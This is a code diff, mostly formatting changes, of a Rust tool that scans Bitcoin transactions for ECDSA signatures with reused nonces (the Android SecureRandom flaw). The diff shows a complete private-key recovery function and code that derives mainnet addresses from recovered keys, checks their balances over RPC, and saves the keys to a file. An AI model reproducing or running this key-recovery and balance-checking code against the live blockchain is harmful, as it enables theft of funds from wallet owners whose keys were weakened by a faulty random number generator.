@@ -1,13 +1,12 @@
 use anyhow::{anyhow, Result};
-use tracing::{info, warn, error};
 use bitcoin::secp256k1::{Secp256k1, SecretKey};
-use bitcoincore_rpc::{Client, RpcApi, Auth};
+use bitcoincore_rpc::{Auth, Client, RpcApi};
 use num_bigint::{BigInt, Sign};
 use num_traits::{Num, One, Zero};
 use std::collections::HashMap;
 use std::fs::OpenOptions;
 use std::io::Write;
-
+use tracing::{error, info, warn};
 
 /// Recover private key from two signatures with the same R value
 /// Given: (r, s1, m1) and (r, s2, m2)
@@ -15,7 +14,10 @@ use std::io::Write;
 /// private_key = (s1 * k - m1) / r mod n
 #[allow(dead_code)]
 fn recover_private_key(r: &[u8], s1: &[u8], s2: &[u8], m1: &[u8], m2: &[u8]) -> Result<Vec<u8>> {
-    let n = BigInt::from_str_radix("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)?;
+    let n = BigInt::from_str_radix(
+        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141",
+        16,
+    )?;
 
     // Convert bytes to BigInt
     let r_int = BigInt::from_bytes_be(Sign::Plus, r);
@@ -26,31 +28,35 @@ fn recover_private_key(r: &[u8], s1: &[u8], s2: &[u8], m1: &[u8], m2: &[u8]) -> 
 
     // Calculate k = (m1 - m2) / (s1 - s2) mod n
     let s_diff = (&s1_int - &s2_int + &n) % &n;
-    let s_diff_inv = mod_inverse(&s_diff, &n)?; 
+    let s_diff_inv = mod_inverse(&s_diff, &n)?;
 
     let m_diff = (&m1_int - &m2_int + &n) % &n;
-    
+
     // k = (m1 - m2) * (s1 - s2)^-1 mod n
     let k = (&m_diff * &s_diff_inv) % &n;
 
     // Calculate private_key = (s1 * k - m1) / r mod n
     let numerator = (&s1_int * &k - &m1_int) % &n;
-    let numerator = if numerator < BigInt::zero() { numerator + &n } else { numerator };
+    let numerator = if numerator < BigInt::zero() {
+        numerator + &n
+    } else {
+        numerator
+    };
 
     let r_inv = mod_inverse(&r_int, &n)?;
-    
+
     let d = (&numerator * &r_inv) % &n;
 
     // Convert to 32-byte array
     let (_, d_bytes) = d.to_bytes_be();
-    
+
     // Pad to 32 bytes
     let mut priv_key = vec![0u8; 32];
     let len = d_bytes.len();
     if len > 32 {
         return Err(anyhow::anyhow!("Private key too large"));
     }
-    priv_key[32-len..].copy_from_slice(&d_bytes);
+    priv_key[32 - len..].copy_from_slice(&d_bytes);
 
     Ok(priv_key)
 }
@@ -442,12 +448,17 @@ pub fn run(
 
                                                 // Derive Bitcoin address from public key
                                                 use bitcoin::{Address, Network};
-                                                let compressed_pubkey = bitcoin::CompressedPublicKey(public_key);
-                                                let address = Address::p2pkh(compressed_pubkey, Network::Bitcoin);
+                                                let compressed_pubkey =
+                                                    bitcoin::CompressedPublicKey(public_key);
+                                                let address = Address::p2pkh(
+                                                    compressed_pubkey,
+                                                    Network::Bitcoin,
+                                                );
                                                 warn!("Derived Address: {}", address);
 
                                                 // Check balance via RPC
-                                                let balance_result = rpc.get_received_by_address(&address, Some(0));
+                                                let balance_result =
+                                                    rpc.get_received_by_address(&address, Some(0));
                                                 let balance = match balance_result {
                                                     Ok(amount) => {
                                                         let btc_amount = amount.to_btc();
@@ -498,10 +509,7 @@ pub fn run(
                                                 }
                                             }
                                             Err(e) => {
-                                                warn!(
-                                                    "⚠️  Failed to recover private key: {}",
-                                                    e
-                                                );
+                                                warn!("⚠️  Failed to recover private key: {}", e);
                                                 warn!("This may be due to missing sighash data or other issues.");
 
                                                 // Still write the duplicate finding to file (append mode)
@@ -547,9 +555,7 @@ pub fn run(
     if duplicates_found > 0 {
         warn!("Found {} vulnerable transactions!", duplicates_found);
         warn!("Private key recovery attempts have been made.");
-        warn!(
-            "Successfully recovered keys are written to android_securerandom_recovered_keys.txt"
-        );
+        warn!("Successfully recovered keys are written to android_securerandom_recovered_keys.txt");
         warn!("Failed recovery attempts are written to android_securerandom_hits.txt");
         warn!("Note: Recovery requires access to transaction sighash data.");
         warn!("If the previous transaction is not available, recovery will fail.");
